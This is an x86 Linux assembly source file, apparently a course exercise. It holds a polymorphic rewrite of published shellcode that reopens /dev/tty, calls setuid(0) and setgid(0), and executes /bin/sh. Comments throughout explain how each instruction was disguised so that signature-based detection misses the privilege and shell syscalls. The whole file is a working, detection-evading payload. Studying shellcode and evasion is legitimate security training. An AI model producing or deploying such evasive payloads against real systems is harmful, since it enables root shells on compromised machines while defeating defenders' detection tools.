;Polymorphic version of original shellcode by Andres C. Rodriguez, all credit goes to him
;You can find original shellcode at http://shell-storm.org/shellcode/files/shellcode-906.php
section .text

      global _start

_start:
	add esp, 0x18

;close(0)
	;xor eax, eax - this instruction is switched out with mul ebx
	xor ebx, ebx
	mul ebx		;this instruction will zero out eax and edx
	mov al, 0x6
	int 0x80

;open("/dev/tty", O_RDWR | ...)
	push ebx

	;push 0x7974742f - switch out push instruction with some arithmetic operations and register push
	mov ecx, 0x79745843
	add cx, 0x1bec
	push ecx

	;push 0x7665642f - switch out push instruction with some arithmetic operations and register push
	sub ecx, 0x30f1011
	add cl, 0x11
	push ecx
	
	mov ebx,esp
	;xor ecx, ecx
	;mov cx, 0x2712 - since cx needs to hold value 0x2712 we will just use our arithmetic operations again
	sub ecx, 0x76653d1d	;ecx = 0x7665642f - 0x76653d1d = 0x2712
	mov al,0x5
	int 0x80

;setuid(0) - setuid syscall may be detected
	;push 0x17
	;pop eax
	mov al, 0x5c	;this value is truncate syscall
	ror al, 0x2	;rotate ax right by two bits we get 0x17 = setuid syscall value
	mov ebx, edx	;xor ebx, ebx - edx holds value 0 so put that value in ebx 
	int 0x80

;setgid(0) - setgid syscall may be detected
	;push 0x2e
	;pop eax
	mov al,0x5c	;this value is truncate syscall
	ror al, 0x1	;rotate ax right by one bit, we get 0x2e = setgid syscall value
	push ebx	;ebx is 0, so it is ok to push it like this
	int 0x80

;execve("/bin/sh", ["/bin/sh"], NULL) - execve syscall mnay be detected
	;xor eax, eax - no need to zero out eax, setgid syscall returns 0 which gets put into eax
	push eax
	
	;push 0x68732f2f - switch out push instruction with some arithmetic operations and register push
	mov ecx, 0xa1ccbcbd
	ror ecx, 0x2
	push ecx

	;push 0x6e69622f - switch out push instruction with some arithmetic operations and register push
	add ecx, 0x5f63301
	sub cl, 0x1
	push ecx
	
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	cltd
        ;mov al, 0xb; - switched out for two instructions which put value 0xb to al
	mov al, 0x5
	add al, 0x6
	int 0x80
